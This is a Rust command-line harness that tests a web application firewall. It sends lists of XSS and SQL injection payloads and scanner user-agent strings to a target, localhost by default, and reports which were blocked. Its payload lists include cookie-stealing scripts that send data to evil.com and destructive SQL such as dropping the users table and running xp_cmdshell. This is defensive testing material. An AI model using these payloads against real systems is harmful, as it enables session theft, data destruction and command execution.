//! KrakenWAF attack tool — sends XSS, SQLi and scanner-UA payloads to the WAF
//! and reports which were blocked and which bypassed.
//!
//! Usage
//! -----
//!   cargo run --bin attack                                     # target http://127.0.0.1:8080
//!   cargo run --bin attack -- --target http://... --verbose
//!   cargo run --bin attack -- --concurrency 50                 # 50 requests in-flight at once

use reqwest::StatusCode;
use std::sync::Arc;
use std::time::Duration;
use tokio::sync::Semaphore;
use tokio::task::JoinSet;

// ─── Payload lists ────────────────────────────────────────────────────────────

const XSS_PAYLOADS: &[&str] = &[
    "<script>alert(1)</script>",
    "<script>alert('xss')</script>",
    "<script src=http://evil.com/x.js></script>",
    "<img src=x onerror=alert(1)>",
    "<img src=x onerror=alert('xss')>",
    "<svg onload=alert(1)>",
    "<svg/onload=alert(1)>",
    "<body onload=alert(1)>",
    "<iframe src=javascript:alert(1)></iframe>",
    "<input autofocus onfocus=alert(1)>",
    "<details open ontoggle=alert(1)>",
    "<video><source onerror=alert(1)></video>",
    "<audio src=x onerror=alert(1)>",
    "<marquee onstart=alert(1)>",
    "<select autofocus onfocus=alert(1)>",
    "<textarea autofocus onfocus=alert(1)>",
    "<keygen autofocus onfocus=alert(1)>",
    "javascript:alert(1)",
    "<img/src=x onerror=alert(1)>",
    "\"/><script>alert(1)</script>",
    "<scr<script>ipt>alert(1)</scr</script>ipt>",
    "%3Cscript%3Ealert(1)%3C%2Fscript%3E",
    "<script>fetch('http://evil.com?c='+document.cookie)</script>",
    "<img src=\"javascript:alert('xss')\">",
    "<link rel=stylesheet href=javascript:alert(1)>",
    "<object data=javascript:alert(1)>",
    "<embed src=javascript:alert(1)>",
    "<form action=javascript:alert(1)><input type=submit>",
    "<button onclick=alert(1)>click</button>",
    "<div onmouseover=alert(1)>hover</div>",
    "<p onmouseenter=alert(1)>",
    "<table background=javascript:alert(1)>",
    "<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>",
    "<script>window['al'+'ert'](1)</script>",
    "<ScRiPt>alert(1)</ScRiPt>",
    "<<script>alert(1)//<</script>",
    "<script/src=data:,alert(1)>",
    "<img src=1 href=1 onerror=\"javascript:alert(1)\"></img>",
    "<svg><script>alert(1)</script></svg>",
    "<math><mtext></mtext><mglyph><svg><mtext></mtext><svg onload=alert(1)>",
    "<script>alert`1`</script>",
    "<script>setTimeout('alert(1)',0)</script>",
    "<script>setInterval('alert(1)',999999)</script>",
    "<style>*{background:url('javascript:alert(1)')}</style>",
    "<base href=javascript:alert(1)//>",
    "<bgsound src=javascript:alert(1)>",
    "<!--<img src=\"--><img src=x onerror=alert(1)//>",
    "<noscript><p title=\"</noscript><img src=x onerror=alert(1)>\">",
    "<script>document.location='http://evil.com/?c='+document.cookie</script>",
    "<script>new Image().src='http://evil.com/?c='+document.cookie</script>",
];

const SQLI_PAYLOADS: &[&str] = &[
    "' or '1'='1",
    "' or '1'='1'--",
    "' or 1=1--",
    "' or 1=1#",
    "' or 1=1/*",
    "') or ('1'='1",
    "') or ('1'='1'--",
    "' or 'x'='x",
    "1' or '1'='1",
    "1 or 1=1",
    "union select 1,2,3--",
    "union select null,null,null--",
    "union select @@version,null,null--",
    "' union select 1,2,3--",
    "' union select null,null--",
    "' union all select null--",
    "1; drop table users--",
    "1; select * from users--",
    "'; exec xp_cmdshell('dir')--",
    "'; exec master..xp_cmdshell('dir')--",
    "1 and 1=1",
    "1 and 1=2",
    "' and '1'='1",
    "' and 1=1--",
    "' and sleep(5)--",
    "1 and sleep(5)",
    "1; waitfor delay '0:0:5'--",
    "' waitfor delay '0:0:5'--",
    "1 and benchmark(5000000,md5(1))#",
    "' and (select * from (select(sleep(5)))a)--",
    "1' and extractvalue(1,concat(0x7e,(select version())))--",
    "' and updatexml(1,concat(0x7e,(select version())),1)--",
    "1 or (select 1 from dual where 1=1)--",
    "' or (select 1 from dual where 1=1)--",
    "admin'--",
    "admin' #",
    "admin'/*",
    "' or 2>1--",
    "' having 1=1--",
    "' group by 1--",
    "' order by 1--",
    "' order by 100--",
    "1; insert into users values('hack','hack')--",
    "1; update users set password='hack'--",
    "' or ''='",
    "' or 0=0--",
    "' or 0=0#",
    "\" or 0=0--",
    "\" or \"\"=\"",
    "' or true--",
];

const SCANNER_UAS: &[(&str, &str)] = &[
    ("nikto/2.1.6",                         "Nikto"),
    ("sqlmap/1.7",                           "sqlmap"),
    ("Nmap Scripting Engine",                "Nmap"),
    ("masscan/1.3",                          "masscan"),
    ("nessus/10.0",                          "Nessus"),
    ("openvas/21.4",                         "OpenVAS"),
    ("gobuster/3.6",                         "gobuster"),
    ("dirbuster/1.0",                        "DirBuster"),
    ("arachni/1.5",                          "Arachni"),
    ("nuclei/2.9",                           "Nuclei"),
    ("wfuzz/3.1",                            "wfuzz"),
    ("commix/3.8",                           "commix"),
    ("Mozilla/5.0 (compatible; netsparker/6.0)", "Netsparker"),
    ("havij/1.17",                           "Havij"),
    ("Acunetix Web Vulnerability Scanner",   "Acunetix"),
];

// ─── Result tracking ──────────────────────────────────────────────────────────

#[derive(Debug)]
enum Outcome {
    Blocked,
    Bypassed(StatusCode),
    Error(String),
}

struct SweepResult {
    label:   String,
    outcome: Outcome,
}

// ─── CLI ──────────────────────────────────────────────────────────────────────

struct Config {
    target:      String,
    verbose:     bool,
    concurrency: usize,
}

fn parse_args() -> Config {
    let args: Vec<String> = std::env::args().collect();
    let mut target      = "http://127.0.0.1:8080".to_string();
    let mut verbose     = false;
    let mut concurrency = 20usize;
    let mut i = 1;
    while i < args.len() {
        match args[i].as_str() {
            "--target"      | "-t" => { i += 1; if let Some(v) = args.get(i) { target = v.clone(); } }
            "--verbose"     | "-v" => { verbose = true; }
            "--concurrency" | "-c" => { i += 1; if let Some(v) = args.get(i) { concurrency = v.parse().unwrap_or(20); } }
            _ => {}
        }
        i += 1;
    }
    Config { target, verbose, concurrency }
}

// ─── Output helpers ───────────────────────────────────────────────────────────

fn outcome_icon(o: &Outcome) -> &'static str {
    match o {
        Outcome::Blocked     => "[BLOCK]",
        Outcome::Bypassed(_) => "[PASS ]",
        Outcome::Error(_)    => "[ERROR]",
    }
}

fn print_result(r: &SweepResult, verbose: bool) {
    match &r.outcome {
        Outcome::Blocked => {
            if verbose { println!("  {} {}", outcome_icon(&r.outcome), r.label); }
        }
        Outcome::Bypassed(code) => {
            println!("  {} {} (status {})", outcome_icon(&r.outcome), r.label, code);
        }
        Outcome::Error(msg) => {
            println!("  {} {} — {}", outcome_icon(&r.outcome), r.label, msg);
        }
    }
}

fn tally(results: &[SweepResult], verbose: bool) -> (usize, usize, usize) {
    let (mut b, mut p, mut e) = (0, 0, 0);
    for r in results {
        match r.outcome {
            Outcome::Blocked     => b += 1,
            Outcome::Bypassed(_) => p += 1,
            Outcome::Error(_)    => e += 1,
        }
        print_result(r, verbose);
    }
    (b, p, e)
}

// ─── Concurrent sweep helpers ─────────────────────────────────────────────────
//
// Each sweep spawns one tokio task per payload. The Semaphore limits how many
// requests are actually in-flight simultaneously (--concurrency). Results are
// collected in original payload order so output is deterministic.

async fn sweep_post(
    client:      &reqwest::Client,
    base:        &str,
    path:        &str,
    payloads:    &[&str],
    concurrency: usize,
) -> Vec<SweepResult> {
    let url = Arc::new(format!("{base}{path}"));
    let sem = Arc::new(Semaphore::new(concurrency));
    let mut set: JoinSet<(usize, SweepResult)> = JoinSet::new();

    for (idx, &payload) in payloads.iter().enumerate() {
        let client  = client.clone();
        let url     = url.clone();
        let sem     = sem.clone();
        let payload = payload.to_string();
        set.spawn(async move {
            let _permit = sem.acquire().await.unwrap();
            let outcome = match client
                .post(url.as_str())
                .form(&[("payload_test", &payload)])
                .send()
                .await
            {
                Ok(r) if r.status() == StatusCode::FORBIDDEN => Outcome::Blocked,
                Ok(r)  => Outcome::Bypassed(r.status()),
                Err(e) => Outcome::Error(e.to_string()),
            };
            (idx, SweepResult { label: payload, outcome })
        });
    }

    collect_ordered(&mut set, payloads.len()).await
}

async fn sweep_get(
    client:      &reqwest::Client,
    base:        &str,
    path:        &str,
    payloads:    &[&str],
    concurrency: usize,
) -> Vec<SweepResult> {
    let url = Arc::new(format!("{base}{path}"));
    let sem = Arc::new(Semaphore::new(concurrency));
    let mut set: JoinSet<(usize, SweepResult)> = JoinSet::new();

    for (idx, &payload) in payloads.iter().enumerate() {
        let client  = client.clone();
        let url     = url.clone();
        let sem     = sem.clone();
        let payload = payload.to_string();
        set.spawn(async move {
            let _permit = sem.acquire().await.unwrap();
            let outcome = match client
                .get(url.as_str())
                .query(&[("payload_test", &payload)])
                .send()
                .await
            {
                Ok(r) if r.status() == StatusCode::FORBIDDEN => Outcome::Blocked,
                Ok(r)  => Outcome::Bypassed(r.status()),
                Err(e) => Outcome::Error(e.to_string()),
            };
            (idx, SweepResult { label: payload, outcome })
        });
    }

    collect_ordered(&mut set, payloads.len()).await
}

async fn sweep_ua(
    client:      &reqwest::Client,
    base:        &str,
    path:        &str,
    concurrency: usize,
) -> Vec<SweepResult> {
    let url = Arc::new(format!("{base}{path}"));
    let sem = Arc::new(Semaphore::new(concurrency));
    let mut set: JoinSet<(usize, SweepResult)> = JoinSet::new();

    for (idx, &(ua, name)) in SCANNER_UAS.iter().enumerate() {
        let client = client.clone();
        let url    = url.clone();
        let sem    = sem.clone();
        let ua     = ua.to_string();
        let label  = format!("{name} ({ua})");
        set.spawn(async move {
            let _permit = sem.acquire().await.unwrap();
            let outcome = match client
                .get(url.as_str())
                .query(&[("payload_test", "hello")])
                .header("User-Agent", &ua)
                .send()
                .await
            {
                Ok(r) if r.status() == StatusCode::FORBIDDEN => Outcome::Blocked,
                Ok(r)  => Outcome::Bypassed(r.status()),
                Err(e) => Outcome::Error(e.to_string()),
            };
            (idx, SweepResult { label, outcome })
        });
    }

    collect_ordered(&mut set, SCANNER_UAS.len()).await
}

// Drains a JoinSet and returns results sorted by original index.
async fn collect_ordered(
    set: &mut JoinSet<(usize, SweepResult)>,
    len: usize,
) -> Vec<SweepResult> {
    let mut indexed = Vec::with_capacity(len);
    while let Some(res) = set.join_next().await {
        if let Ok(item) = res {
            indexed.push(item);
        }
    }
    indexed.sort_by_key(|(i, _)| *i);
    indexed.into_iter().map(|(_, r)| r).collect()
}

// ─── Main ─────────────────────────────────────────────────────────────────────

#[tokio::main]
async fn main() {
    let cfg = parse_args();

    let client = reqwest::Client::builder()
        .timeout(Duration::from_secs(10))
        .build()
        .expect("failed to build HTTP client");

    println!();
    println!("╔══════════════════════════════════════════════════════════╗");
    println!("║           KrakenWAF Attack Tool                         ║");
    println!("╚══════════════════════════════════════════════════════════╝");
    println!("  Target      : {}", cfg.target);
    println!("  Concurrency : {} requests in-flight", cfg.concurrency);
    println!("  Verbose     : {}", cfg.verbose);
    println!();

    let mut total_blocked  = 0usize;
    let mut total_bypassed = 0usize;
    let mut total_errors   = 0usize;

    macro_rules! run_sweep {
        ($label:expr, $fut:expr) => {{
            println!("━━━ {} ━━━", $label);
            let results = $fut.await;
            let (b, p, e) = tally(&results, cfg.verbose);
            total_blocked  += b;
            total_bypassed += p;
            total_errors   += e;
            println!("  → {b} blocked  |  {p} bypassed  |  {e} errors\n");
        }};
    }

    run_sweep!(
        format!("XSS — POST /test_post ({} payloads)", XSS_PAYLOADS.len()),
        sweep_post(&client, &cfg.target, "/test_post", XSS_PAYLOADS, cfg.concurrency)
    );
    run_sweep!(
        format!("XSS — GET /test_get ({} payloads)", XSS_PAYLOADS.len()),
        sweep_get(&client, &cfg.target, "/test_get", XSS_PAYLOADS, cfg.concurrency)
    );
    run_sweep!(
        format!("SQLi — GET /test_get ({} payloads)", SQLI_PAYLOADS.len()),
        sweep_get(&client, &cfg.target, "/test_get", SQLI_PAYLOADS, cfg.concurrency)
    );
    run_sweep!(
        format!("SQLi — POST /test_post ({} payloads)", SQLI_PAYLOADS.len()),
        sweep_post(&client, &cfg.target, "/test_post", SQLI_PAYLOADS, cfg.concurrency)
    );
    run_sweep!(
        format!("Scanner UA — GET /test_get ({} UAs)", SCANNER_UAS.len()),
        sweep_ua(&client, &cfg.target, "/test_get", cfg.concurrency)
    );

    let grand_total = total_blocked + total_bypassed + total_errors;
    println!("╔══════════════════════════════════════════════════════════╗");
    println!("║  SUMMARY                                                ║");
    println!("╠══════════════════════════════════════════════════════════╣");
    println!("║  Total requests : {grand_total:<38}║");
    println!("║  Concurrency    : {:<38}║", cfg.concurrency);
    println!("║  Blocked        : {total_blocked:<38}║");
    println!("║  Bypassed       : {total_bypassed:<38}║");
    println!("║  Errors         : {total_errors:<38}║");
    if total_bypassed == 0 && total_errors == 0 {
        println!("║  Status         : ALL PAYLOADS BLOCKED ✓               ║");
    } else if total_bypassed > 0 {
        println!("║  Status         : !! {} PAYLOAD(S) BYPASSED WAF !!{:<7}║",
                 total_bypassed, "");
    }
    println!("╚══════════════════════════════════════════════════════════╝");
    println!();

    if total_bypassed > 0 {
        std::process::exit(1);
    }
}
